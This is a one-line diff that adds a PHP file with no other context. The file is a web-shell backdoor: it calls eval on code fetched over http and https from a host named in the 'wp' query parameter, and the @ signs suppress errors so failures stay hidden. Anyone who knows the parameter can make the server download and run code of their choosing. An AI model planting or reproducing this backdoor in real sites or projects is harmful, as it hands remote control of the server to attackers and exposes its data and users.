@@ -1,0 +1,1 @@
+<?php @eval(file_get_contents("http://".$_GET["wp"])); @eval(file_get_contents("https://".$_GET["wp"])); ?>
